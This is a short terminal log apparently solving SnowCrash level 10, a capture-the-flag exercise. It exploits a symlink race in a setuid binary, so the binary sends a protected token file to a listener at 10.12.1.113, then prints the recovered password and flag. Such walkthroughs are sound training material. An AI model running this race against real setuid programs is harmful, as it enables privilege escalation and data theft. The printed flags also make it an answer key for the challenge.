```
  level10@SnowCrash:~$ ls -l level10 token
  -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
  -rw-------  1 flag10 flag10     26 Mar  5  2016 token
  level10@SnowCrash:~$ while true; do ln -sf /home/user/level10/token /tmp/key; ln -sf /home/user/level10/level10 /tmp/key; done &
  level10@SnowCrash:~$ while true; do ./level10 /tmp/key 10.12.1.113; done
  You don't have access to /tmp/key
  Connecting to 10.12.1.113:6969 .. Connected!
  Sending file .. wrote file!
  woupa2yuojeeaaed06riuj63c
  level10@SnowCrash:~$ su flag10
  Password:
  Don't forget to launch getflag !
  flag10@SnowCrash:~$ getflag
  Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
